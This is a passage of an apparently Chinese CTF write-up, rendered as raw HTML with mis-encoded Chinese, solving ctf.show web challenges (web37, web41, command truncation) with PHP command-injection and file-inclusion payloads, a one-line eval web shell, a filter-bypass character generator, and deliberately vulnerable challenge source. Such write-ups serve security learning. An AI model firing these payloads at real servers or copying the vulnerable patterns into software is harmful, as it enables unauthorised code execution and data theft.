å‘½ä»¤ï¼šLinuxä¸­nlå‘½ä»¤å’Œcatå‘½ä»¤å¾ˆåƒï¼Œä¸è¿‡nlå‘½ä»¤ä¼šæ‰“ä¸Šè¡Œå·ï¼Œnlæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦f12æŸ¥çœ‹æºä»£ç </span><br><span class="line">/?c=<span class="built_in">echo</span> `nl fl?g.php`;</span><br><span class="line"># æ­¤å¤–ä¹Ÿå¯ä»¥ç”¨&#x27;&#x27;æ¥ç»•è¿‡è¿‡æ»¤</span><br><span class="line"><span class="built_in">echo</span> `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•å››ï¼šå¤åˆ¶å¤§æ³•</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp fla* 1.txt,ç„¶åè®¿é—®ç›®å½•ä¸‹çš„1.txtå³å¯</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># åŒç†ï¼Œå¦‚æœå±è”½systemï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨exec</span></span><br><span class="line">?c=<span class="title function_ invoke__">exec</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># åŒç†è¿˜æœ‰passthru</span></span><br><span class="line">/?c=<span class="title function_ invoke__">passthru</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äº”ï¼šåˆ©ç”¨å‚æ•°è¾“å…¥+eval</p><ul><li>ç”±äºç³»ç»Ÿåªä¼šæ£€æµ‹$cä¸­çš„å†…å®¹ï¼Œåˆ™æˆ‘ä»¬é€šè¿‡eval()å‡½æ•°æ„é€ å‚æ•°1å·§å¦™ç»•è¿‡</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span></span><br><span class="line">/?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>flag.php%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•å…­ï¼šæ–‡ä»¶åŒ…å«</p><ul><li>ä½¿ç”¨includeå°†1åŒ…å«è¿›æ¥ï¼Œ1å†ä½¿ç”¨phpä¼ªåè®®ä½¿ç”¨PHPå†…éƒ¨è®¾ç½®çš„è¿‡æ»¤å™¨ï¼Œå°†flag.phpæ–‡ä»¶è¯»å–å¹¶ä»¥base64ç¼–ç çš„æ ¼å¼è¿”å›</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…¶ä¸­$_GETä¹Ÿå¯ä»¥æ”¹æˆ$_REQUEST</span></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">require</span> <span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸ƒï¼šä¸€å¥è¯æœ¨é©¬</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•å…«ï¼š</p><blockquote><p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚<br>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­å½“å‰å…ƒç´ ï¼ˆæŒ‡é’ˆæŒ‡å‘ï¼‰çš„å€¼ã€‚<br>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œæ•°ç»„ã€‚<br>array_reverse() å°†æ•°ç»„å€’åºè¾“å‡ºã€‚<br>next() å°†æŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¾“å‡ºã€‚<br>show_source() å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºï¼Œæ˜¯highlight_file()åˆ«åã€‚</p></blockquote>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment"># ç­‰ä»·</span></span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"><span class="comment"># å…¶ä¸­show_sourceå¯ä»¥æ¢æˆhighlight_fileå’Œreadfile</span></span><br></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥ï¼Œè¯­å¥çš„æ­¥éª¤æ˜¯<br>å…ˆæ‹¿åˆ°ä¸€ä¸ª.&#x3D;&#x3D;ã€‹localeconv() pos()</p><p>æ¥ç€æ‰«æ.ç›®å½•ï¼Œå³å½“å‰ç›®å½•&#x3D;&#x3D;ã€‹scandir()</p><p>å°†æ‰«æå®Œçš„ç›®å½•å€’å™&#x3D;ã€‹array_reverse(),å› ä¸ºæ­£åºç¬¬ä¸€ç¬¬äºŒåˆ†åˆ«æ˜¯: . ..</p><p>å°†å€’åºå®Œæ¯•çš„æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ è¾“å‡º&#x3D;&#x3D;ã€‹next() </p><p>â€‹- å› ä¸ºç›®å½•çš„é¡ºåºåˆ†åˆ«æ˜¯. .. flag.php index.phpå› æ­¤æˆ‘ä»¬å€’åºåç¬¬äºŒä¸ªæ˜¯flag.php</p><p>æ‰“å°æ–‡ä»¶ä¿¡æ¯&#x3D;&#x3D;ã€‹show_source()</p></blockquote></li><li><p>æ–¹æ³•ä¹ï¼š</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">RCE</a> </p><ul><li><p>å¯ä»¥é€šè¿‡</p><ul><li>$_GET</li><li>$_POST</li><li>$_FILES</li><li>$_COOKIE</li></ul><p><code>?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;cat flag.php&quot;);</code></p></li></ul></li></ul><h4><span id="web37">web37</span></h4><ul><li><p>çŸ¥è¯†ç‚¹</p><ul><li>è€ƒå¯Ÿdataåè®®</li></ul></li><li><p>dataä¼ªåè®®ï¼šå°†åé¢çš„å­—ç¬¦å½“åšPHPä»£ç æ‰§è¡Œ</p><p>data:&#x2F;&#x2F;ï¼Œç±»ä¼¼php:&#x2F;&#x2F;inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p><code>?c=data://text/plain;base64,[base64_encode_shell]</code></p><p>çœ‹æºä»£ç ï¼Œå› ä¸ºflag.phpæ³¨é‡Šæ³¨é‡Šäº†flagï¼Œæ‰€ä»¥çœ‹ä¸è§ï¼Œéœ€è¦æŸ¥çœ‹æºä»£ç ä¹Ÿå¯ä»¥ä½¿ç”¨tacæ¥è¯»å–ï¼Œç ´åphpçš„æ³¨é‡Šè§„åˆ™ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸Šçœ‹è§flagäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é¢˜è§£</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span></span><br><span class="line">/?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web41">web41</span></h4><p>è¿™ä¸ªé¢˜è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦<code>|</code>ã€‚<br>æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚</p><p>ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯ç”¨å­—ç¬¦çš„é›†åˆ</span></span><br><span class="line"><span class="comment"># rce_or.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment"># é¢˜ç›®çš„æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">            pattern = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">            <span class="comment"># å¦‚æœå½“å‰å¤–å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œç›´æ¥è·³è¿‡æ‰€æœ‰å†…å±‚å¾ªç¯</span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(i)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># å¦‚æœå½“å‰å†…å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œè·³è¿‡è¯¥å…ƒç´ </span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(j)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># [2:]æ˜¯å› ä¸ºpythonä¸­hexè¡¨ç¤ºæ˜¯0xffè¿™æ ·çš„å½¢å¼ï¼Œå»æ‰å‰é¢çš„0xï¼Œç»„æˆ2ä½urlç¼–ç </span></span><br><span class="line">            hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">            <span class="comment"># urlç¼–ç çš„æ–¹å¼å’ŒASCIIç ä¸€æ ·ï¼Œä½†éœ€è¦åœ¨å‰é¢åŠ ä¸Š%</span></span><br><span class="line">            url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">            url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">            <span class="comment"># cæ˜¯æˆ‘ä»¬è¦æ„é€ çš„å‚æ•°ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦ä¼ lså‘½ä»¤ï¼Œlå°±è¦æ‹†åˆ†æˆa|bï¼Œå…¶ä¸­|æ˜¯å› ä¸ºé¢˜ç›®æ²¡æœ‰è¿‡æ»¤|ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆå…¶ä»–ä»»æ„æ“ä½œ</span></span><br><span class="line">            c = <span class="built_in">ord</span>(urllib.parse.unquote(url_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(url_j))</span><br><span class="line">            <span class="comment"># å¦‚æœcæ˜¯å¯è§çš„å­—ç¬¦</span></span><br><span class="line">            <span class="keyword">if</span> c &gt;=<span class="number">32</span> <span class="keyword">and</span> c&lt;=<span class="number">126</span>:</span><br><span class="line">                f.write(<span class="built_in">chr</span>(c)+<span class="string">&quot; &quot;</span>+url_i+<span class="string">&quot; &quot;</span>+url_j+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥<code>python exp.py http://403c8935-1b28-4410-8d96-512661e9649f.challenge.ctf.show/</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] your functionï¼šsystem</span><br><span class="line">[+] your commandï¼šcat flag.php</span><br></pre></td></tr></table></figure><p>å³å¯è·å–flag</p><p><a href="https://blog.csdn.net/qq_40345591/article/details/127773706">ä»£ç è§£æ</a>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨ChatGPTä¸ºæˆ‘ä»¬åˆ†æä»£ç ï¼Œç„¶ådebugçœ‹çœ‹æ€ä¹ˆè¿è¡Œçš„ã€‚</p><h4><span id="å‘½ä»¤æˆªæ–­">å‘½ä»¤æˆªæ–­</span></h4><p>æˆ‘ä»¬çœ‹ä¸€çœ¼é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒæ„æ€æ˜¯å°†å‘½ä»¤å…¨è¾“å‡ºåˆ°**&#x2F;dev&#x2F;null**ä¸­ï¼ŒåŒæ—¶é”™è¯¯ä¿¡æ¯æµä¹Ÿä¼šè¢«é‡å®šå‘åˆ°æ­£ç¡®ä¿¡æ¯æµä¸­ã€‚</p><ul><li><strong>Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</strong><ol><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚</li><li>â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol></li></ul><p>è¿™é“é¢˜ä¸­æˆ‘ä»¬å¯ä»¥ç”¨&amp;&amp;æ‹¼æ¥ï¼Œç„¶åè®©åé¢æ‰§è¡Œçš„å‘½ä»¤é‡å®šå‘åˆ°**&#x2F;dev&#x2F;null**ä¸­å³å¯</p><ul><li>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨æˆªæ–­çš„æ–¹æ³•ï¼Œè®©åé¢é‡å®šå‘ä¸èµ·ä½œç”¨<ul><li>æˆªæ–­æ–¹æ³•<code> ; , &amp;&amp; , %0aï¼Œ||</code>ç­‰ç­‰ï¼Œæœ‰å¾ˆå¤šæˆªæ–­æ–¹æ³•</li></ul></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># éœ€è¦urlç¼–ç </span><br><span class="line">/?c=ls&amp;&amp;ls</span><br><span class="line">?c=ls;</span><br><span class="line">?c=ls%<span class="number">0</span>a</span><br><span class="line">?c=tac flag.php;</span><br><span class="line">/?c=ta\c&lt;&gt;fla\g.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><h4><span 